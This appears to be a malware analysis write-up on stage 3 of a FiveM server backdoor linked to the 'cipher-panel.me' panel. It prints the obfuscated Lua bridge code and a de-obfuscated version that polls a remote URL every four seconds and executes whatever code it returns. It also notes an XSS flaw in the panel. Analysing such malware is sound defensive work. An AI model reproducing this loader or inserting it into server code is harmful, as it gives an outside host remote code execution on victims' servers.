# Phase 3

Let's begin with the Stage 3 bridge code. Stage 2 Refers to the Stage 3 page which in turn refers to the stage3b.php 

Stage3 Bridge Code:
```
local KCfouVmGAagEXRDcykxRRbujceCvVdiIkBujnmJdJrsZOHeKkGZQnDHElqwTAOinIRyjpL, DsKLUvmTaEovxYRHLWOrIjldKpUGpnBzurWiSVtxVgSqGgsfbNOtfhCHTabAufCaKuqvhI, wwJeYyOybasBJkLeAJpEyyxigATLqxGxaAREuJvJUUyxxQhzuvdPFdqewXeoOkrIaqpHXP, PrSLQPVOnDTzkIbjPMAXjzARQedTBpynhdSixeXwvZjswaUHtlYATzEkotTAcZSomQdjXj, CtIDluLIlBKKuAIXZinvYOfKWPMsfUWyisMLLQEMzmLDxbdYaoNrprrjJsLKgsNhCgyzJU = Citizen, CreateThread, true, PerformHttpRequest, assert local UcACCNxwbZHGZfNHXSzNtsgicMYEPDtorKgwhVlAKBRCXiadoBTFYVaCIvADLivQOwuIVi, idfGtNjnYhRTSQXcRFkGRzAlmKwWaGGKXmlalaVLyytdfrWxpZZCcInAmXtJCShViyoHQQ, GvntgCfWrVNnsbhaYCarIuLjewfOAVQDcWeCNkjJxWVzlJwqwVOoLKkMORkjwAgcUHwaFV, cDXGzopUzgPIrGAIeToTcXMukYoEvXFLihjMnaTfVdOBLekRUBFkWtFliaUnogtQsUJMhg, oqLcfMywNayDZonFNVkADDXcJpokKnfxbOBzBzAOuoMTqAGfDWhjjhQgkPLyiactaSOTwf, TgTFgoQcvrZXFlAJCXJiPsMpIrpzmuxwPDxpSIIEeuzzQwtHscXMzffrDZqQJLaBsJAnkd, vbHBgtwpcrxlprAEmjMjwjxUjlmAkhsPFMKRwyTPpwsvAgJwZPbizJvVjyldIUjRYPwJLa = load, Wait, 4000, 200, "", nil, false KCfouVmGAagEXRDcykxRRbujceCvVdiIkBujnmJdJrsZOHeKkGZQnDHElqwTAOinIRyjpL.CreateThread(function() while wwJeYyOybasBJkLeAJpEyyxigATLqxGxaAREuJvJUUyxxQhzuvdPFdqewXeoOkrIaqpHXP do PrSLQPVOnDTzkIbjPMAXjzARQedTBpynhdSixeXwvZjswaUHtlYATzEkotTAcZSomQdjXj('https://cipher-panel.me/_i/v2_/stage3b.php?asf=dyszN1JQeDRubHZhVFdEY21vcUtORzZPS0hReXlFeEd5S1loZWdoUXUrcXhwbWJhNm1mMjdIRWFJZ0dFVFdNTg==', function (QuVZHEddvjBavRLgttCLTNdEisYRRRoWRhepcxSWyuxPQWWnFibTolnnrkeeHgDjCGbnln, KLyJiPGKWqyWTlmzwYJhtSutOlQQTlogJlpCEDluogHdKysQcCVjzJQLWAPONAzjzlhajp) if(QuVZHEddvjBavRLgttCLTNdEisYRRRoWRhepcxSWyuxPQWWnFibTolnnrkeeHgDjCGbnln == cDXGzopUzgPIrGAIeToTcXMukYoEvXFLihjMnaTfVdOBLekRUBFkWtFliaUnogtQsUJMhg) then if (KLyJiPGKWqyWTlmzwYJhtSutOlQQTlogJlpCEDluogHdKysQcCVjzJQLWAPONAzjzlhajp == TgTFgoQcvrZXFlAJCXJiPsMpIrpzmuxwPDxpSIIEeuzzQwtHscXMzffrDZqQJLaBsJAnkd or KLyJiPGKWqyWTlmzwYJhtSutOlQQTlogJlpCEDluogHdKysQcCVjzJQLWAPONAzjzlhajp == oqLcfMywNayDZonFNVkADDXcJpokKnfxbOBzBzAOuoMTqAGfDWhjjhQgkPLyiactaSOTwf) then return end local fJYvKXLWGTQUqTACrmyrbJXwXfnaAGuoDzbUkjgsthZlToIVURYgkxnlUPFhfBGBdaogTP = CtIDluLIlBKKuAIXZinvYOfKWPMsfUWyisMLLQEMzmLDxbdYaoNrprrjJsLKgsNhCgyzJU(UcACCNxwbZHGZfNHXSzNtsgicMYEPDtorKgwhVlAKBRCXiadoBTFYVaCIvADLivQOwuIVi(KLyJiPGKWqyWTlmzwYJhtSutOlQQTlogJlpCEDluogHdKysQcCVjzJQLWAPONAzjzlhajp)) fJYvKXLWGTQUqTACrmyrbJXwXfnaAGuoDzbUkjgsthZlToIVURYgkxnlUPFhfBGBdaogTP() wwJeYyOybasBJkLeAJpEyyxigATLqxGxaAREuJvJUUyxxQhzuvdPFdqewXeoOkrIaqpHXP = vbHBgtwpcrxlprAEmjMjwjxUjlmAkhsPFMKRwyTPpwsvAgJwZPbizJvVjyldIUjRYPwJLa end end) KCfouVmGAagEXRDcykxRRbujceCvVdiIkBujnmJdJrsZOHeKkGZQnDHElqwTAOinIRyjpL.Wait(GvntgCfWrVNnsbhaYCarIuLjewfOAVQDcWeCNkjJxWVzlJwqwVOoLKkMORkjwAgcUHwaFV) end end)
```

Using some logical thinking we can see that the it's using function arrays to make it harder to read. 
They did effectively obfuscate the entire first stage but with this stage they left some stuff out like the CreateThread, The url is plain text this round, and the Citizen is obfuscated but the Wait isn't. Better yet they added the obfuscated string for CreateThread but never used it. De-obfuscating this part gets us:
```
Citizen.CreateThread(function() 
	while true do 
		PerformHttpRequest('https://cipher-panel.me/_i/v2_/stage3b.php?asf=dyszN1JQeDRubHZhVFdEY21vcUtORzZPS0hReXlFeEd5S1loZWdoUXUrcXhwbWJhNm1mMjdIRWFJZ0dFVFdNTg==', function (errorCode, resultData) 
		if(errorCode == 200) then 
			if (resultData == nil or resultData == "") then 
				return 
			end 
			local payLoadFunc = assert(load(resultData)) 
			payLoadFunc() 
			resultData = false 
			end 
		end) 
		Citizen.Wait(4000) 
	end 
end)
```

I'm sure there are some spaces wrong but the goal is't to make it working it's to find out it's functions and behavior.
Looking at this we can see it refers to the stage3b.php page with a token. That token is random generated from the stage2 page.
Weird thing is that we can view the page content without having to do a curl with the FXServer user agent. 
Interesting note though is if you fill in a random number at https://cipher-panel.me/_i/v2_/stage3.php?to=1, you will be receiving a different output on the stage3b.php. This part is vulnerable for XSS.

From the stage3b.php isn't much to get on about. Code blocks are all obfuscated and it's functions is unknown. 
Only thing visible from the code is that it receives the code from stage4 and executes them in order.
Other than that, there are a lot of decimal blocks, also 0 fivem functions that are visible, seems like this is mainly the executor for the payloads send from the panel to the stage4
